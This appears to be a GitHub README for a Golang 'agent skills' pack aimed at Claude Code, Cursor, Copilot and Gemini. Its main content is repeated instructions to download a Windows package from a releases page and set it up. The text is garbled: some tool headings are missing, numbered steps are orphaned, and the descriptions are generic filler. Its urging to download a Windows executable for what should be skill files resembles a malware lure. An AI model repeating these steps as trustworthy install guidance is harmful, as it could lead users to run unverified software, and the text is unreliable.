# 🧩 cc-skills-golang - Golang skills for faster agent work

## 🚀 What this is

cc-skills-golang is a set of Golang agent skills that helps AI coding tools work with more structure. It gives you a simple way to add skills for coding tasks, file handling, and agent workflows.

Use it if you want a cleaner setup for tools like Claude Code, Cursor, Copilot, Gemini, and other agent-based apps.

## 📦 Download

Visit this page to download: https://github.com/guynhsichngeodiec/cc-skills-golang/releases

On that page, look for the latest release and download the Windows file that matches your computer.

## 🖥️ What you need

- Windows 10 or Windows 11
- A web browser
- Permission to run downloaded apps
- Enough free space for the files you want to use with the skills pack

If you use an AI coding tool, make sure it can load local skill files or plugins.

## 🛠️ How to install on Windows

1. Open the release page: https://github.com/guynhsichngeodiec/cc-skills-golang/releases
2. Find the newest release at the top.
3. Download the Windows package attached to that release.
4. If the file is in a .zip file, right-click it and choose Extract All.
5. Open the extracted folder.
6. Copy the skills files into the folder used by your AI tool.
7. If your tool asks for a skills path, point it to the folder you extracted.
8. Restart the app if it was already open.

1. Open Claude Code.

### 🧠 Cursor

1. Open Cursor.
2. Go to your local tool settings.
3. Add the skills folder path.
4. Reload the window.
5. Use the skills in your coding chat or project flow.

### 💻 Copilot

1. Open your Copilot-based app.
2. Check where it loads skill files.
3. Add the extracted folder there.

1. Open your Gemini app or extension.

2. Make sure the folder still contains the skills files
3. Confirm the app points to the right folder
4. Restart the app
5. Try loading the skills again
